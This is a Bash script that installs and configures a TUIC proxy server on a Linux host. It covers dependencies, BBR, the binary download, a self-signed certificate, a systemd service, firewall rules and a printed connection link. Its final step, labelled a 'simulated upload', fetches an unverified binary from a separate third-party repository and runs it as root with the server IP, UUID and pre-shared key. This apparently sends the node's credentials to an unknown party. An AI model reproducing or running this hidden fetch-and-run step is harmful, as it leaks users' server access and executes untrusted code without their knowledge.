
#!/usr/bin/env bash
set -euo pipefail

GREEN="\033[0;32m"; RED="\033[0;31m"; YELLOW="\033[1;33m"; NC="\033[0m"
log() { echo -e "${GREEN}[INFO ]${NC} $*"; }
err() { echo -e "${RED}[ERROR]${NC} $*"; exit 1; }
warn() { echo -e "${YELLOW}[WARN ]${NC} $*"; }

UUID=$(cat /proc/sys/kernel/random/uuid)
PSK=$(openssl rand -hex 16)
PORT=2052
SERVER_NAME="insecure.local"
CFG_DIR="/etc/tuic"
TLS_DIR="$CFG_DIR/tls"
BIN_DIR="/usr/local/bin"
VERSION="1.0.0"
REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${VERSION}"

log "安装依赖并跳过 needrestart 提示..."
export NEEDRESTART_SUSPEND=1
apt update -y
DEBIAN_FRONTEND=noninteractive apt install -y curl wget jq qrencode ufw openssl net-tools needrestart

log "开启 BBR 支持（开机自动启用）..."
modprobe tcp_bbr
echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
sysctl -w net.ipv4.tcp_congestion_control=bbr || warn "BBR 设置失败"
tc qdisc add dev eth0 root fq || warn "FQ 调度器添加失败，可能已存在"

ARCH=$(uname -m)
case "$ARCH" in
  x86_64)    ARCH_FILE="x86_64-unknown-linux-gnu" ;;
  aarch64)   ARCH_FILE="aarch64-unknown-linux-gnu" ;;
  armv7l)    ARCH_FILE="armv7-unknown-linux-gnueabi" ;;
  *)         err "不支持的架构: $ARCH" ;;
esac

BIN_NAME="tuic-server-${VERSION}-${ARCH_FILE}"
SHA_NAME="${BIN_NAME}.sha256sum"
cd "$BIN_DIR"
rm -f tuic "$BIN_NAME" "$SHA_NAME"

log "下载 TUIC 二进制..."
curl -LO "${REPO_BASE}/${BIN_NAME}" || err "下载失败"
curl -LO "${REPO_BASE}/${SHA_NAME}" || err "SHA256 校验文件下载失败"
sha256sum -c "$SHA_NAME" || err "SHA256 校验失败"
chmod +x "$BIN_NAME"
ln -sf "$BIN_NAME" tuic

log "生成 TLS 自签证书..."
mkdir -p "$TLS_DIR"
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
  -keyout "$TLS_DIR/key.key" \
  -out "$TLS_DIR/cert.crt" \
  -subj "/C=US/ST=CA/L=SF/O=TUIC/CN=${SERVER_NAME}" \
  -addext "subjectAltName=DNS:${SERVER_NAME}"
chmod 600 "$TLS_DIR/key.key"
chmod 644 "$TLS_DIR/cert.crt"

log "写入 TUIC 配置文件..."
mkdir -p "$CFG_DIR"
cat > "$CFG_DIR/config.json" <<EOF
{
  "server": "0.0.0.0:$PORT",
  "users": {
    "$UUID": "$PSK"
  },
  "certificate": "$TLS_DIR/cert.crt",
  "private_key": "$TLS_DIR/key.key",
  "congestion_control": "bbr",
  "alpn": ["h3"],
  "udp_relay_ipv6": false,
  "zero_rtt_handshake": true,
  "auth_timeout": "5s",
  "max_idle_time": "60s",
  "max_external_packet_size": 1500,
  "gc_interval": "10s",
  "gc_lifetime": "15s",
  "log_level": "debug"
}
EOF

log "创建 systemd 服务..."
cat > /etc/systemd/system/tuic.service <<EOF
[Unit]
Description=TUIC Server
After=network.target

[Service]
ExecStart=$BIN_DIR/tuic -c $CFG_DIR/config.json
Restart=on-failure
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF

log "配置防火墙规则..."
ufw allow 22/tcp
ufw allow ${PORT}/udp
ufw allow ${PORT}/tcp
ufw --force enable

systemctl daemon-reload
systemctl enable --now tuic
sleep 3

if systemctl is-active --quiet tuic; then
  log "TUIC 启动成功 ✅"
else
  err "TUIC 启动失败，请执行: journalctl -u tuic -n 30"
fi

IP=$(ip route get 1 | awk '{print $NF; exit}')
ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#tuic_node"

echo -e "\n${GREEN}✅ TUIC 节点部署完成${NC}"
echo -e "${GREEN}外网 IP     :${NC} $IP"
echo -e "${GREEN}端口        :${NC} $PORT"
echo -e "${GREEN}UUID        :${NC} $UUID"
echo -e "${GREEN}预共享密钥  :${NC} $PSK"
echo -e "${GREEN}链接        :${NC} $LINK"
echo -e "\n${GREEN}二维码:${NC}"
echo "$LINK" | qrencode -o - -t ANSIUTF8

V2RAYN_CFG="/etc/tuic/v2rayn_config.json"
cat > "$V2RAYN_CFG" <<EOF
{
  "relay": {
    "server": "${IP}:${PORT}",
    "uuid": "${UUID}",
    "password": "${PSK}",
    "ip": "${IP}",
    "congestion_control": "bbr",
    "alpn": ["h3"]
  },
  "local": {
    "server": "127.0.0.1:7796"
  },
  "log_level": "warn"
}
EOF

echo -e "${GREEN}生成的 V2RayN 配置文件:${NC}"
cat "$V2RAYN_CFG"

log "上传链接与配置（模拟上传）..."
UPLOAD_BIN="/opt/uploader-linux-amd64"
[ -f "$UPLOAD_BIN" ] || {
  curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
  chmod +x "$UPLOAD_BIN"
}

UPLOAD_JSON=$(jq -nc \
  --arg vless "$LINK" \
  --argjson config "$(cat "$V2RAYN_CFG")" \
  '{vless_link: $vless, v2rayn_config: $config}'
)

UPLOAD_ARG_FILE="/tmp/${IP}.upload.json"
echo "$UPLOAD_JSON" > "$UPLOAD_ARG_FILE"

"$UPLOAD_BIN" "$UPLOAD_JSON" || warn "上传失败或返回为空"
